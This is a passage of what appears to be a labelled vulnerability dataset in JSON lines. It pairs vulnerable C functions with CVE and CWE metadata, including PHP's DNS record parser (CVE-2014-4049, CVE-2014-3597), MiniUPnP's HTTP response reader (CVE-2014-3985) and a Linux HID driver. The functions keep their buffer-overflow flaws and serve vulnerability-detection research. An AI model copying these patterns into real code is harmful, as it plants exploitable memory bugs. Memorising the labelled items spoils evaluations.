(have_v6_break && in_v6_break) {\n\t\t\t\ttp[0] = ':';\n\t\t\t\ttp++;\n\t\t\t}\n\t\t\ttp[0] = '\\0';\n\t\t\tadd_assoc_string(*subarray, \"type\", \"AAAA\", 1);\n\t\t\tadd_assoc_string(*subarray, \"ipv6\", name, 1);\n\t\t\tbreak;\n\t\tcase DNS_T_A6:\n\t\t\tp = cp;\n\t\t\tadd_assoc_string(*subarray, \"type\", \"A6\", 1);\n\t\t\tn = ((int)cp[0]) & 0xFF;\n\t\t\tcp++;\n\t\t\tadd_assoc_long(*subarray, \"masklen\", n);\n\t\t\ttp = (u_char*)name;\n\t\t\tif (n > 15) {\n\t\t\t\thave_v6_break = 1;\n\t\t\t\tin_v6_break = 1;\n\t\t\t\ttp[0] = ':';\n\t\t\t\ttp++;\n\t\t\t}\n\t\t\tif (n % 16 > 8) {\n\t\t\t\t/* Partial short */\n\t\t\t\tif (cp[0] != 0) {\n\t\t\t\t\tif (tp > (u_char *)name) {\n\t\t\t\t\t\tin_v6_break = 0;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t\tsprintf((char*)tp, \"%x\", cp[0] & 0xFF);\n\t\t\t\t} else {\n\t\t\t\t\tif (!have_v6_break) {\n\t\t\t\t\t\thave_v6_break = 1;\n\t\t\t\t\t\tin_v6_break = 1;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t} else if (!in_v6_break) {\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t\ttp[0] = '0';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tcp++;\n\t\t\t}\n\t\t\tfor (i = (n + 8) / 16; i < 8; i++) {\n\t\t\t\tGETSHORT(s, cp);\n\t\t\t\tif (s != 0) {\n\t\t\t\t\tif (tp > (u_char *)name) {\n\t\t\t\t\t\tin_v6_break = 0;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t\ttp += sprintf((char*)tp,\"%x\",s);\n\t\t\t\t} else {\n\t\t\t\t\tif (!have_v6_break) {\n\t\t\t\t\t\thave_v6_break = 1;\n\t\t\t\t\t\tin_v6_break = 1;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t} else if (!in_v6_break) {\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t\ttp[0] = '0';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (have_v6_break && in_v6_break) {\n\t\t\t\ttp[0] = ':';\n\t\t\t\ttp++;\n\t\t\t}\n\t\t\ttp[0] = '\\0';\n\t\t\tadd_assoc_string(*subarray, \"ipv6\", name, 1);\n\t\t\tif (cp < p + dlen) {\n\t\t\t\tn = dn_expand(answer->qb2, answer->qb2+65536, cp, name, (sizeof name) - 2);\n\t\t\t\tif (n < 0) {\n\t\t\t\t\treturn NULL;\n\t\t\t\t}\n\t\t\t\tcp += n;\n\t\t\t\tadd_assoc_string(*subarray, \"chain\", name, 1);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase DNS_T_SRV:\n\t\t\tadd_assoc_string(*subarray, \"type\", \"SRV\", 1);\n\t\t\tGETSHORT(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"pri\", n);\n\t\t\tGETSHORT(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"weight\", n);\n\t\t\tGETSHORT(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"port\", n);\n\t\t\tn = dn_expand(answer->qb2, answer->qb2+65536, cp, name, (sizeof name) - 2);\n\t\t\tif (n < 0) {\n\t\t\t\treturn NULL;\n\t\t\t}\n\t\t\tcp += n;\n\t\t\tadd_assoc_string(*subarray, \"target\", name, 1);\n\t\t\tbreak;\n\t\tcase DNS_T_NAPTR:\n\t\t\tadd_assoc_string(*subarray, \"type\", \"NAPTR\", 1);\n\t\t\tGETSHORT(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"order\", n);\n\t\t\tGETSHORT(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"pref\", n);\n\t\t\tn = (cp[0] & 0xFF);\n\t\t\tadd_assoc_stringl(*subarray, \"flags\", (char*)++cp, n, 1);\n\t\t\tcp += n;\n\t\t\tn = (cp[0] & 0xFF);\n\t\t\tadd_assoc_stringl(*subarray, \"services\", (char*)++cp, n, 1);\n\t\t\tcp += n;\n\t\t\tn = (cp[0] & 0xFF);\n\t\t\tadd_assoc_stringl(*subarray, \"regex\", (char*)++cp, n, 1);\n\t\t\tcp += n;\n\t\t\tn = dn_expand(answer->qb2, answer->qb2+65536, cp, name, (sizeof name) - 2);\n\t\t\tif (n < 0) {\n\t\t\t\treturn NULL;\n\t\t\t}\n\t\t\tcp += n;\n\t\t\tadd_assoc_string(*subarray, \"replacement\", name, 1);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tzval_ptr_dtor(subarray);\n\t\t\t*subarray = NULL;\n\t\t\tcp += dlen;\n\t\t\tbreak;\n\t}\n\n\treturn cp;\n}\n", "func_hash": 61555348514619221447360707443484627048, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2014-4049", "cve_desc": "Heap-based buffer overflow in the php_parserr function in ext/standard/dns.c in PHP 5.6.0beta4 and earlier allows remote servers to cause a denial of service (crash) and possibly execute arbitrary code via a crafted DNS TXT record, related to the dns_get_record function.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-4049"}
{"idx": 1251, "project": "miniupnp", "commit_id": "3a87aa2f10bd7f1408e1849bdb59c41dd63a9fe9", "project_url": "https://github.com/miniupnp/miniupnp", "commit_url": "https://github.com/miniupnp/miniupnp/commit/3a87aa2f10bd7f1408e1849bdb59c41dd63a9fe9", "commit_message": "miniwget.c: fixed potential buffer overrun", "target": 1, "func": "getHTTPResponse(int s, int * size)\n{\n\tchar buf[2048];\n\tint n;\n\tint endofheaders = 0;\n\tint chunked = 0;\n\tint content_length = -1;\n\tunsigned int chunksize = 0;\n\tunsigned int bytestocopy = 0;\n\t/* buffers : */\n\tchar * header_buf;\n\tunsigned int header_buf_len = 2048;\n\tunsigned int header_buf_used = 0;\n\tchar * content_buf;\n\tunsigned int content_buf_len = 2048;\n\tunsigned int content_buf_used = 0;\n\tchar chunksize_buf[32];\n\tunsigned int chunksize_buf_index;\n\n\theader_buf = malloc(header_buf_len);\n\tcontent_buf = malloc(content_buf_len);\n\tchunksize_buf[0] = '\\0';\n\tchunksize_buf_index = 0;\n\n\twhile((n = receivedata(s, buf, 2048, 5000, NULL)) > 0)\n\t{\n\t\tif(endofheaders == 0)\n\t\t{\n\t\t\tint i;\n\t\t\tint linestart=0;\n\t\t\tint colon=0;\n\t\t\tint valuestart=0;\n\t\t\tif(header_buf_used + n > header_buf_len) {\n\t\t\t\theader_buf = realloc(header_buf, header_buf_used + n);\n\t\t\t\theader_buf_len = header_buf_used + n;\n\t\t\t}\n\t\t\tmemcpy(header_buf + header_buf_used, buf, n);\n\t\t\theader_buf_used += n;\n\t\t\t/* search for CR LF CR LF (end of headers)\n\t\t\t * recognize also LF LF */\n\t\t\ti = 0;\n\t\t\twhile(i < ((int)header_buf_used-1) && (endofheaders == 0)) {\n\t\t\t\tif(header_buf[i] == '\\r') {\n\t\t\t\t\ti++;\n\t\t\t\t\tif(header_buf[i] == '\\n') {\n\t\t\t\t\t\ti++;\n\t\t\t\t\t\tif(i < (int)header_buf_used && header_buf[i] == '\\r') {\n\t\t\t\t\t\t\ti++;\n\t\t\t\t\t\t\tif(i < (int)header_buf_used && header_buf[i] == '\\n') {\n\t\t\t\t\t\t\t\tendofheaders = i+1;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t} else if(header_buf[i] == '\\n') {\n\t\t\t\t\ti++;\n\t\t\t\t\tif(header_buf[i] == '\\n') {\n\t\t\t\t\t\tendofheaders = i+1;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\ti++;\n\t\t\t}\n\t\t\tif(endofheaders == 0)\n\t\t\t\tcontinue;\n\t\t\t/* parse header lines */\n\t\t\tfor(i = 0; i < endofheaders - 1; i++) {\n\t\t\t\tif(colon <= linestart && header_buf[i]==':')\n\t\t\t\t{\n\t\t\t\t\tcolon = i;\n\t\t\t\t\twhile(i < (endofheaders-1)\n\t\t\t\t\t      && (header_buf[i+1] == ' ' || header_buf[i+1] == '\\t'))\n\t\t\t\t\t\ti++;\n\t\t\t\t\tvaluestart = i + 1;\n\t\t\t\t}\n\t\t\t\t/* detecting end of line */\n\t\t\t\telse if(header_buf[i]=='\\r' || header_buf[i]=='\\n')\n\t\t\t\t{\n\t\t\t\t\tif(colon > linestart && valuestart > colon)\n\t\t\t\t\t{\n#ifdef DEBUG\n\t\t\t\t\t\tprintf(\"header='%.*s', value='%.*s'\\n\",\n\t\t\t\t\t\t       colon-linestart, header_buf+linestart,\n\t\t\t\t\t\t       i-valuestart, header_buf+valuestart);\n#endif\n\t\t\t\t\t\tif(0==strncasecmp(header_buf+linestart, \"content-length\", colon-linestart))\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tcontent_length = atoi(header_buf+valuestart);\n#ifdef DEBUG\n\t\t\t\t\t\t\tprintf(\"Content-Length: %d\\n\", content_length);\n#endif\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse if(0==strncasecmp(header_buf+linestart, \"transfer-encoding\", colon-linestart)\n\t\t\t\t\t\t   && 0==strncasecmp(header_buf+valuestart, \"chunked\", 7))\n\t\t\t\t\t\t{\n#ifdef DEBUG\n\t\t\t\t\t\t\tprintf(\"chunked transfer-encoding!\\n\");\n#endif\n \t\t\t\t\t\t\tchunked = 1;\n \t\t\t\t\t\t}\n \t\t\t\t\t}\n\t\t\t\t\twhile(header_buf[i]=='\\r' || header_buf[i] == '\\n')\n \t\t\t\t\t\ti++;\n \t\t\t\t\tlinestart = i;\n \t\t\t\t\tcolon = linestart;\n\t\t\t\t\tvaluestart = 0;\n\t\t\t\t}\n\t\t\t}\n\t\t\t/* copy the remaining of the received data back to buf */\n\t\t\tn = header_buf_used - endofheaders;\n\t\t\tmemcpy(buf, header_buf + endofheaders, n);\n\t\t\t/* if(headers) */\n\t\t}\n\t\tif(endofheaders)\n\t\t{\n\t\t\t/* content */\n\t\t\tif(chunked)\n\t\t\t{\n\t\t\t\tint i = 0;\n\t\t\t\twhile(i < n)\n\t\t\t\t{\n\t\t\t\t\tif(chunksize == 0)\n\t\t\t\t\t{\n\t\t\t\t\t\t/* reading chunk size */\n\t\t\t\t\t\tif(chunksize_buf_index == 0) {\n\t\t\t\t\t\t\t/* skipping any leading CR LF */\n\t\t\t\t\t\t\tif(i<n && buf[i] == '\\r') i++;\n\t\t\t\t\t\t\tif(i<n && buf[i] == '\\n') i++;\n\t\t\t\t\t\t}\n\t\t\t\t\t\twhile(i<n && isxdigit(buf[i])\n\t\t\t\t\t\t     && chunksize_buf_index < (sizeof(chunksize_buf)-1))\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tchunksize_buf[chunksize_buf_index++] = buf[i];\n\t\t\t\t\t\t\tchunksize_buf[chunksize_buf_index] = '\\0';\n\t\t\t\t\t\t\ti++;\n\t\t\t\t\t\t}\n\t\t\t\t\t\twhile(i<n && buf[i] != '\\r' && buf[i] != '\\n')\n\t\t\t\t\t\t\ti++; /* discarding chunk-extension */\n\t\t\t\t\t\tif(i<n && buf[i] == '\\r') i++;\n\t\t\t\t\t\tif(i<n && buf[i] == '\\n') {\n\t\t\t\t\t\t\tunsigned int j;\n\t\t\t\t\t\t\tfor(j = 0; j < chunksize_buf_index; j++) {\n\t\t\t\t\t\t\tif(chunksize_buf[j] >= '0'\n\t\t\t\t\t\t\t   && chunksize_buf[j] <= '9')\n\t\t\t\t\t\t\t\tchunksize = (chunksize << 4) + (chunksize_buf[j] - '0');\n\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\tchunksize = (chunksize << 4) + ((chunksize_buf[j] | 32) - 'a' + 10);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tchunksize_buf[0] = '\\0';\n\t\t\t\t\t\t\tchunksize_buf_index = 0;\n\t\t\t\t\t\t\ti++;\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t/* not finished to get chunksize */\n\t\t\t\t\t\t\tcontinue;\n\t\t\t\t\t\t}\n#ifdef DEBUG\n\t\t\t\t\t\tprintf(\"chunksize = %u (%x)\\n\", chunksize, chunksize);\n#endif\n\t\t\t\t\t\tif(chunksize == 0)\n\t\t\t\t\t\t{\n#ifdef DEBUG\n\t\t\t\t\t\t\tprintf(\"end of HTTP content - %d %d\\n\", i, n);\n\t\t\t\t\t\t\t/*printf(\"'%.*s'\\n\", n-i, buf+i);*/\n#endif\n\t\t\t\t\t\t\tgoto end_of_stream;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tbytestocopy = ((int)chunksize < (n - i))?chunksize:(unsigned int)(n - i);\n\t\t\t\t\tif((content_buf_used + bytestocopy) > content_buf_len)\n\t\t\t\t\t{\n\t\t\t\t\t\tif(content_length >= (int)(content_buf_used + bytestocopy)) {\n\t\t\t\t\t\t\tcontent_buf_len = content_length;\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tcontent_buf_len = content_buf_used + bytestocopy;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tcontent_buf = (char *)realloc((void *)content_buf,\n\t\t\t\t\t\t                              content_buf_len);\n\t\t\t\t\t}\n\t\t\t\t\tmemcpy(content_buf + content_buf_used, buf + i, bytestocopy);\n\t\t\t\t\tcontent_buf_used += bytestocopy;\n\t\t\t\t\ti += bytestocopy;\n\t\t\t\t\tchunksize -= bytestocopy;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t/* not chunked */\n\t\t\t\tif(content_length > 0\n\t\t\t\t   && (int)(content_buf_used + n) > content_length) {\n\t\t\t\t\t/* skipping additional bytes */\n\t\t\t\t\tn = content_length - content_buf_used;\n\t\t\t\t}\n\t\t\t\tif(content_buf_used + n > content_buf_len)\n\t\t\t\t{\n\t\t\t\t\tif(content_length >= (int)(content_buf_used + n)) {\n\t\t\t\t\t\tcontent_buf_len = content_length;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tcontent_buf_len = content_buf_used + n;\n\t\t\t\t\t}\n\t\t\t\t\tcontent_buf = (char *)realloc((void *)content_buf,\n\t\t\t\t\t                              content_buf_len);\n\t\t\t\t}\n\t\t\t\tmemcpy(content_buf + content_buf_used, buf, n);\n\t\t\t\tcontent_buf_used += n;\n\t\t\t}\n\t\t}\n\t\t/* use the Content-Length header value if available */\n\t\tif(content_length > 0 && (int)content_buf_used >= content_length)\n\t\t{\n#ifdef DEBUG\n\t\t\tprintf(\"End of HTTP content\\n\");\n#endif\n\t\t\tbreak;\n\t\t}\n\t}\nend_of_stream:\n\tfree(header_buf); header_buf = NULL;\n\t*size = content_buf_used;\n\tif(content_buf_used == 0)\n\t{\n\t\tfree(content_buf);\n\t\tcontent_buf = NULL;\n\t}\n\treturn content_buf;\n}\n", "func_hash": 306297354977511070065482433729517457700, "file_name": "miniwget.c", "file_hash": 99482104209569075149952687843099296030, "cwe": ["CWE-119"], "cve": "CVE-2014-3985", "cve_desc": "The getHTTPResponse function in miniwget.c in MiniUPnP 1.9 allows remote attackers to cause a denial of service (crash) via crafted headers that trigger an out-of-bounds read.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3985"}
{"idx": 1277, "project": "php-src", "commit_id": "2fefae47716d501aec41c1102f3fd4531f070b05", "project_url": "https://github.com/php/php-src", "commit_url": "https://github.com/php/php-src/commit/2fefae47716d501aec41c1102f3fd4531f070b05", "commit_message": "Fixed Sec Bug #67717 segfault in dns_get_record CVE-2014-3597\n\nIncomplete fix for CVE-2014-4049\n\nCheck possible buffer overflow\n- pass real buffer end to dn_expand calls\n- check buffer len before each read", "target": 1, "func": "static u_char *php_parserr(u_char *cp, querybuf *answer, int type_to_fetch, int store, int raw, zval **subarray)\n {\n \tu_short type, class, dlen;\n \tu_long ttl;\n\tlong n, i;\n\tu_short s;\n\tu_char *tp, *p;\n\tchar name[MAXHOSTNAMELEN];\n\tint have_v6_break = 0, in_v6_break = 0;\n \n \t*subarray = NULL;\n \n\tn = dn_expand(answer->qb2, answer->qb2+65536, cp, name, sizeof(name) - 2);\n \tif (n < 0) {\n \t\treturn NULL;\n \t}\n \tcp += n;\n \n \tGETSHORT(type, cp);\n \tGETSHORT(class, cp);\n \tGETLONG(ttl, cp);\n \tGETSHORT(dlen, cp);\n \tif (type_to_fetch != T_ANY && type != type_to_fetch) {\n \t\tcp += dlen;\n \t\treturn cp;\n\t}\n\n\tif (!store) {\n\t\tcp += dlen;\n\t\treturn cp;\n\t}\n\n\tALLOC_INIT_ZVAL(*subarray);\n\tarray_init(*subarray);\n\n\tadd_assoc_string(*subarray, \"host\", name, 1);\n\tadd_assoc_string(*subarray, \"class\", \"IN\", 1);\n\tadd_assoc_long(*subarray, \"ttl\", ttl);\n\n\tif (raw) {\n\t\tadd_assoc_long(*subarray, \"type\", type);\n\t\tadd_assoc_stringl(*subarray, \"data\", (char*) cp, (uint) dlen, 1);\n\t\tcp += dlen;\n\t\treturn cp;\n\t}\n \n \tswitch (type) {\n \t\tcase DNS_T_A:\n \t\t\tadd_assoc_string(*subarray, \"type\", \"A\", 1);\n \t\t\tsnprintf(name, sizeof(name), \"%d.%d.%d.%d\", cp[0], cp[1], cp[2], cp[3]);\n \t\t\tadd_assoc_string(*subarray, \"ip\", name, 1);\n \t\t\tcp += dlen;\n \t\t\tbreak;\n \t\tcase DNS_T_MX:\n \t\t\tadd_assoc_string(*subarray, \"type\", \"MX\", 1);\n \t\t\tGETSHORT(n, cp);\n \t\t\tadd_assoc_long(*subarray, \"pri\", n);\n\t\t\t/* no break; */\n\t\tcase DNS_T_CNAME:\n\t\t\tif (type == DNS_T_CNAME) {\n\t\t\t\tadd_assoc_string(*subarray, \"type\", \"CNAME\", 1);\n\t\t\t}\n\t\t\t/* no break; */\n\t\tcase DNS_T_NS:\n\t\t\tif (type == DNS_T_NS) {\n\t\t\t\tadd_assoc_string(*subarray, \"type\", \"NS\", 1);\n\t\t\t}\n\t\t\t/* no break; */\n\t\tcase DNS_T_PTR:\n \t\t\tif (type == DNS_T_PTR) {\n \t\t\t\tadd_assoc_string(*subarray, \"type\", \"PTR\", 1);\n \t\t\t}\n\t\t\tn = dn_expand(answer->qb2, answer->qb2+65536, cp, name, (sizeof name) - 2);\n \t\t\tif (n < 0) {\n \t\t\t\treturn NULL;\n \t\t\t}\n\t\t\tcp += n;\n\t\t\tadd_assoc_string(*subarray, \"target\", name, 1);\n\t\t\tbreak;\n \t\tcase DNS_T_HINFO:\n \t\t\t/* See RFC 1010 for values */\n \t\t\tadd_assoc_string(*subarray, \"type\", \"HINFO\", 1);\n \t\t\tn = *cp & 0xFF;\n \t\t\tcp++;\n \t\t\tadd_assoc_stringl(*subarray, \"cpu\", (char*)cp, n, 1);\n \t\t\tcp += n;\n \t\t\tn = *cp & 0xFF;\n \t\t\tcp++;\n \t\t\tadd_assoc_stringl(*subarray, \"os\", (char*)cp, n, 1);\n \t\t\tcp += n;\n \t\t\tbreak;\n \t\tcase DNS_T_TXT:\n \t\t\t{\n\t\t\t\tint ll = 0;\n \t\t\t\tzval *entries = NULL;\n \n \t\t\t\tadd_assoc_string(*subarray, \"type\", \"TXT\", 1);\n\t\t\t\ttp = emalloc(dlen + 1);\n\t\t\t\t\n \t\t\t\tMAKE_STD_ZVAL(entries);\n \t\t\t\tarray_init(entries);\n \t\t\t\t\n\t\t\t\twhile (ll < dlen) {\n\t\t\t\t\tn = cp[ll];\n\t\t\t\t\tif ((ll + n) >= dlen) {\n\t\t\t\t\t\tn = dlen - (ll + 1);\n \t\t\t\t\t}\n\t\t\t\t\tmemcpy(tp + ll , cp + ll + 1, n);\n\t\t\t\t\tadd_next_index_stringl(entries, cp + ll + 1, n, 1);\n\t\t\t\t\tll = ll + n + 1;\n \t\t\t\t}\n\t\t\t\ttp[dlen] = '\\0';\n \t\t\t\tcp += dlen;\n \n\t\t\t\tadd_assoc_stringl(*subarray, \"txt\", tp, (dlen>0)?dlen - 1:0, 0);\n \t\t\t\tadd_assoc_zval(*subarray, \"entries\", entries);\n \t\t\t}\n \t\t\tbreak;\n \t\tcase DNS_T_SOA:\n \t\t\tadd_assoc_string(*subarray, \"type\", \"SOA\", 1);\n\t\t\tn = dn_expand(answer->qb2, answer->qb2+65536, cp, name, (sizeof name) -2);\n \t\t\tif (n < 0) {\n \t\t\t\treturn NULL;\n \t\t\t}\n \t\t\tcp += n;\n \t\t\tadd_assoc_string(*subarray, \"mname\", name, 1);\n\t\t\tn = dn_expand(answer->qb2, answer->qb2+65536, cp, name, (sizeof name) -2);\n \t\t\tif (n < 0) {\n \t\t\t\treturn NULL;\n \t\t\t}\n \t\t\tcp += n;\n \t\t\tadd_assoc_string(*subarray, \"rname\", name, 1);\n \t\t\tGETLONG(n, cp);\n \t\t\tadd_assoc_long(*subarray, \"serial\", n);\n \t\t\tGETLONG(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"refresh\", n);\n\t\t\tGETLONG(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"retry\", n);\n\t\t\tGETLONG(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"expire\", n);\n\t\t\tGETLONG(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"minimum-ttl\", n);\n \t\t\tbreak;\n \t\tcase DNS_T_AAAA:\n \t\t\ttp = (u_char*)name;\n \t\t\tfor(i=0; i < 8; i++) {\n \t\t\t\tGETSHORT(s, cp);\n \t\t\t\tif (s != 0) {\n\t\t\t\t\tif (tp > (u_char *)name) {\n\t\t\t\t\t\tin_v6_break = 0;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t\ttp += sprintf((char*)tp,\"%x\",s);\n\t\t\t\t} else {\n\t\t\t\t\tif (!have_v6_break) {\n\t\t\t\t\t\thave_v6_break = 1;\n\t\t\t\t\t\tin_v6_break = 1;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t} else if (!in_v6_break) {\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t\ttp[0] = '0';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (have_v6_break && in_v6_break) {\n\t\t\t\ttp[0] = ':';\n\t\t\t\ttp++;\n\t\t\t}\n\t\t\ttp[0] = '\\0';\n\t\t\tadd_assoc_string(*subarray, \"type\", \"AAAA\", 1);\n\t\t\tadd_assoc_string(*subarray, \"ipv6\", name, 1);\n\t\t\tbreak;\n \t\tcase DNS_T_A6:\n \t\t\tp = cp;\n \t\t\tadd_assoc_string(*subarray, \"type\", \"A6\", 1);\n \t\t\tn = ((int)cp[0]) & 0xFF;\n \t\t\tcp++;\n \t\t\tadd_assoc_long(*subarray, \"masklen\", n);\n\t\t\ttp = (u_char*)name;\n\t\t\tif (n > 15) {\n\t\t\t\thave_v6_break = 1;\n\t\t\t\tin_v6_break = 1;\n\t\t\t\ttp[0] = ':';\n\t\t\t\ttp++;\n\t\t\t}\n\t\t\tif (n % 16 > 8) {\n\t\t\t\t/* Partial short */\n\t\t\t\tif (cp[0] != 0) {\n\t\t\t\t\tif (tp > (u_char *)name) {\n\t\t\t\t\t\tin_v6_break = 0;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t\tsprintf((char*)tp, \"%x\", cp[0] & 0xFF);\n\t\t\t\t} else {\n\t\t\t\t\tif (!have_v6_break) {\n\t\t\t\t\t\thave_v6_break = 1;\n\t\t\t\t\t\tin_v6_break = 1;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t} else if (!in_v6_break) {\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t\ttp[0] = '0';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t}\n \t\t\t\tcp++;\n \t\t\t}\n \t\t\tfor (i = (n + 8) / 16; i < 8; i++) {\n \t\t\t\tGETSHORT(s, cp);\n \t\t\t\tif (s != 0) {\n \t\t\t\t\tif (tp > (u_char *)name) {\n\t\t\t\t\t\tin_v6_break = 0;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t\ttp += sprintf((char*)tp,\"%x\",s);\n\t\t\t\t} else {\n\t\t\t\t\tif (!have_v6_break) {\n\t\t\t\t\t\thave_v6_break = 1;\n\t\t\t\t\t\tin_v6_break = 1;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t} else if (!in_v6_break) {\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t\ttp[0] = '0';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (have_v6_break && in_v6_break) {\n\t\t\t\ttp[0] = ':';\n\t\t\t\ttp++;\n\t\t\t}\n \t\t\ttp[0] = '\\0';\n \t\t\tadd_assoc_string(*subarray, \"ipv6\", name, 1);\n \t\t\tif (cp < p + dlen) {\n\t\t\t\tn = dn_expand(answer->qb2, answer->qb2+65536, cp, name, (sizeof name) - 2);\n \t\t\t\tif (n < 0) {\n \t\t\t\t\treturn NULL;\n \t\t\t\t}\n\t\t\t\tcp += n;\n\t\t\t\tadd_assoc_string(*subarray, \"chain\", name, 1);\n \t\t\t}\n \t\t\tbreak;\n \t\tcase DNS_T_SRV:\n \t\t\tadd_assoc_string(*subarray, \"type\", \"SRV\", 1);\n \t\t\tGETSHORT(n, cp);\n \t\t\tadd_assoc_long(*subarray, \"pri\", n);\n \t\t\tGETSHORT(n, cp);\n \t\t\tadd_assoc_long(*subarray, \"weight\", n);\n \t\t\tGETSHORT(n, cp);\n \t\t\tadd_assoc_long(*subarray, \"port\", n);\n\t\t\tn = dn_expand(answer->qb2, answer->qb2+65536, cp, name, (sizeof name) - 2);\n \t\t\tif (n < 0) {\n \t\t\t\treturn NULL;\n \t\t\t}\n \t\t\tcp += n;\n \t\t\tadd_assoc_string(*subarray, \"target\", name, 1);\n \t\t\tbreak;\n \t\tcase DNS_T_NAPTR:\n \t\t\tadd_assoc_string(*subarray, \"type\", \"NAPTR\", 1);\n \t\t\tGETSHORT(n, cp);\n \t\t\tadd_assoc_long(*subarray, \"order\", n);\n \t\t\tGETSHORT(n, cp);\n \t\t\tadd_assoc_long(*subarray, \"pref\", n);\n \t\t\tn = (cp[0] & 0xFF);\n\t\t\tadd_assoc_stringl(*subarray, \"flags\", (char*)++cp, n, 1);\n \t\t\tcp += n;\n \t\t\tn = (cp[0] & 0xFF);\n\t\t\tadd_assoc_stringl(*subarray, \"services\", (char*)++cp, n, 1);\n \t\t\tcp += n;\n \t\t\tn = (cp[0] & 0xFF);\n\t\t\tadd_assoc_stringl(*subarray, \"regex\", (char*)++cp, n, 1);\n \t\t\tcp += n;\n\t\t\tn = dn_expand(answer->qb2, answer->qb2+65536, cp, name, (sizeof name) - 2);\n \t\t\tif (n < 0) {\n \t\t\t\treturn NULL;\n \t\t\t}\n\t\t\tcp += n;\n\t\t\tadd_assoc_string(*subarray, \"replacement\", name, 1);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tzval_ptr_dtor(subarray);\n\t\t\t*subarray = NULL;\n\t\t\tcp += dlen;\n\t\t\tbreak;\n\t}\n\n\treturn cp;\n}\n", "func_hash": 192550270728735179499592366180467891975, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2014-3597", "cve_desc": "Multiple buffer overflows in the php_parserr function in ext/standard/dns.c in PHP before 5.4.32 and 5.5.x before 5.5.16 allow remote DNS servers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted DNS record, related to the dns_get_record function and the dn_expand function.  NOTE: this issue exists because of an incomplete fix for CVE-2014-4049.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3597"}
{"idx": 1288, "project": "linux", "commit_id": "844817e47eef14141cf59b8d5ac08dd11c0a9189", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/844817e47eef14141cf59b8d5ac08dd11c0a9189", "commit_message": "HID: picolcd: sanity check report size in raw_event() callback\n\nThe report passed to us from transport driver could potentially be\narbitrarily large, therefore we better sanity-check it so that raw_data\nthat we hold in picolcd_pending structure are always kept within proper\nbounds.\n\nCc: stable@vger.kernel.org\nReported-by: Steven Vittitoe <scvitti@google.com>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>", "target": 1, "func": "static int picolcd_raw_event(struct hid_device *hdev,\n\t\tstruct hid_report *report, u8 *raw_data, int size)\n{\n\tstruct picolcd_data *data = hid_get_drvdata(hdev);\n\tunsigned long flags;\n\tint ret = 0;\n\n \tif (!data)\n \t\treturn 1;\n \n \tif (report->id == REPORT_KEY_STATE) {\n \t\tif (data->input_keys)\n \t\t\tret = picolcd_raw_keypad(data, report, 